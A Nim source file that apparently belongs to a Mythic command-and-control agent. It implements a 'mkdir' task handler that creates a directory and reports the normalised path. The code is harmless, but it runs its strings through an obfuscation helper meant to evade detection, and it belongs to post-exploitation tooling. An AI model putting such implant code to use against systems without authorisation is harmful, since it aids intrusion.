import ../utils/m_responses
import ../utils/debug
import ../utils/strenc
import std/[json, os, strformat, strutils]

type
  MkdirArgs = object
    path: string

proc makeDirectory*(taskId: string, params: string): JsonNode =
  # Parse arguments
  let args = parseJson(params).to(MkdirArgs)
  
  debug "[DEBUG] Creating directory: ", args.path
  
  try:
    # Create the directory (including parent directories)
    createDir(args.path)
    
    # Get the absolute path - handle UNC paths
    let absPath = if args.path.startsWith("\\\\") or isAbsolute(args.path):
      args.path
    else:
      getCurrentDir() / args.path
    
    let normalizedPath = normalizedPath(absPath)
    
    debug "[DEBUG] Created directory: ", normalizedPath
    
    return mythicSuccess(taskId, obf("Created directory '") & normalizedPath & "'")
    
  except OSError as e:
    return mythicError(taskId, obf("Failed to create directory: ") & e.msg)
  except Exception as e:
    return mythicError(taskId, obf("Error: ") & e.msg)
